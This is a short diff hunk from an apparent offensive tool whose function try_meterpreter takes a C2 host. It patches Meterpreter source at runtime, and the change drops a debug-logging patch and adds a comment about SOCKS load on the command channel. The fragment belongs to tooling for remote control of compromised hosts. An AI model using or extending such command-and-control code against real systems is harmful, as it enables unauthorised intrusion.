@@ -549,10 +549,10 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 'self.communication_last + '
                 'self.communication_timeout < time.time())',
                 'comm-expire-guard')
-            _patch('DEBUGGING = False',
-                   'DEBUGGING = True; DEBUGGING_LOG_FILE_PATH = '
-                   '"/tmp/landnav_met_debug.log"',
-                   'debug-enable')
+            # DEBUGGING patch removed in v0.5.3 — per-packet file I/O
+            # starves the command channel under SOCKS load.  The
+            # diagnostic injection around met.run() (below) is kept
+            # because it writes only two lines total (INIT + ENDED).
 
             if _patches_applied:
                 log.info("Source patches applied: %s",
